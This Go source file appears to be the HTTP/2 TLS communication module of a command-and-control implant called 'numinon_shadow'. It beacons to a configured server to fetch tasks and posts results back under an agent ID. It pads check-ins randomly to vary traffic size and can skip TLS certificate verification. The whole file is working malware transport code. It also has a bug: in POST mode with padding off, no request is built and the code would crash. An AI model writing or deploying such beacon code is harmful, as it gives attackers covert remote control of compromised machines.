package comm

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/agent/utils"
	"numinon_shadow/internal/models"
	"strings"
)

var _ Communicator = (*Http2TLSCommunicator)(nil)

type Http2TLSCommunicator struct {
	agentConfig config.AgentConfig
	httpClient  *http.Client
}

func NewHttp2TLSCommunicator(cfg config.AgentConfig) (*Http2TLSCommunicator, error) {
	err := BasicValidateH2TLS(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|COMM INIT|-> Initializing HTTP/2 TLS Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)

	tlsConfig := &tls.Config{
		InsecureSkipVerify: cfg.SkipVerifyTLS,
	}

	transport := &http.Transport{
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}

	client := &http.Client{
		Transport: transport,
	}

	return &Http2TLSCommunicator{
		agentConfig: cfg,
		httpClient:  client,
	}, nil

}

func BasicValidateH2TLS(cfg config.AgentConfig) error {
	if cfg.Protocol != config.HTTP2TLS {
		return fmt.Errorf("mismatched config: NewHttp2ClearCommunicator called with protocol %s", cfg.Protocol)
	}
	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
		return fmt.Errorf("config requires ServerIP, ServerPort, and CheckInEndpoint")
	}
	return nil
}

func (c *Http2TLSCommunicator) Connect() error {
	log.Printf("|COMM %s|-> Connect() called. Typically no-op for HTTP/2.", c.agentConfig.Protocol)
	return nil
}

func (c *Http2TLSCommunicator) Disconnect() error {
	log.Printf("|🔌 COMM %s|-> Disconnect() called.", c.agentConfig.Protocol)

	if transport, ok := c.httpClient.Transport.(*http.Transport); ok {
		transport.CloseIdleConnections()
		log.Println("Client disconnected from server.")
	}

	return nil
}

// CheckIn performs a GET request to the CheckInEndpoint to fetch tasks.
// Returns the raw response body which might contain tasking information.
func (c *Http2TLSCommunicator) CheckIn() ([]byte, error) {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https",
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.CheckInEndpoint,
	}
	fullURL := targetURL.String()

	// CREATE THE REQUEST
	var req *http.Request
	var err error
	// --- Conditional GET vs POST ---
	if strings.ToUpper(c.agentConfig.CheckinMethod) == "POST" {
		log.Printf("|COMM %s|-> Checking in via POST to %s", c.Type(), fullURL)

		payloadPadding, err := utils.GenerateRandomPadding(c.agentConfig.MinPaddingBytes, c.agentConfig.MaxPaddingBytes)

		if err != nil {
			return nil, err
		}

		if c.agentConfig.EnablePadding && c.agentConfig.MaxPaddingBytes > 0 {
			checkinPayload := models.AgentCheckIn{
				Padding: payloadPadding,
			}
			log.Printf("|COMM %s|-> Added padding (SIZE: %d bytes) to POST check-in.", c.Type(), len(payloadPadding))

			bodyBytes, marshalErr := json.Marshal(checkinPayload)
			if marshalErr != nil {
				log.Printf("|❗ERR COMM %s| Failed to marshal POST check-in payload: %v", c.Type(), marshalErr)
				return nil, fmt.Errorf("failed to marshal POST check-in payload: %w", marshalErr)
			}

			req, err = http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(bodyBytes))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
			}
		}

	} else { // Default to GET
		log.Printf("|COMM %s|-> Checking in via GET to %s", c.Type(), fullURL)
		req, err = http.NewRequest(http.MethodGet, fullURL, nil)
	}

	if err != nil {
		log.Printf("|❗ERR COMM %s| Failed to create check-in request: %v", c.Type(), err)
		return nil, fmt.Errorf("failed to create %s check-in request: %w", c.Type(), err)
	}

	// SET HEADERS
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Checkin")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Check-in request failed: %v", err)
		return nil, fmt.Errorf("http check-in request failed: %w", err)
	}
	defer resp.Body.Close()

	// --- VERIFY PROTOCOL ---
	// Check if HTTP/2 was actually negotiated.
	log.Printf("|COMM H2TLS|-> Check-in response: Status=%s, PROTOCOL=%s", resp.Status, resp.Proto)
	if resp.ProtoMajor != 2 {
		log.Printf("|WARN COMM H2TLS| Expected HTTP/2, but received %s!", resp.Proto)
	}
	// --- END VERIFY PROTOCOL ---

	// READ RESPONSE (COULD CONTAIN INSTRUCTIONS)
	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("|❗ERR COMM H2TLS| Failed to read check-in response body: %v", err)
		return nil, fmt.Errorf("failed to read check-in response body: %w", err)
	}

	log.Printf("|COMM H2TLS|-> Successfully read %d bytes from check-in response", len(responseBody))
	return responseBody, nil
}

// SendResult performs a POST request to the ResultsEndpoint to submit task results.
func (c *Http2TLSCommunicator) SendResult(resultData []byte) error {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https", // Hardcoded for H1C
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.ResultsEndpoint,
	}
	fullURL := targetURL.String()
	log.Printf("|COMM H2TLS|-> Sending %d bytes of results via POST to %s", len(resultData), fullURL)

	// CREATE THE HTTP POST REQUEST
	req, err := http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(resultData))
	if err != nil {
		log.Printf("|❗ERR COMM H2TLS| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// SET THE HEADERS
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Result")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H2TLS| Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("|COMM H2TLS|-> Results POST response: Status=%s, Proto=%s", resp.Status, resp.Proto)

	log.Printf("|COMM H2TLS|-> Successfully sent results.")
	return nil
}

func (c *Http2TLSCommunicator) Type() config.AgentProtocol {
	return config.HTTP2TLS
}
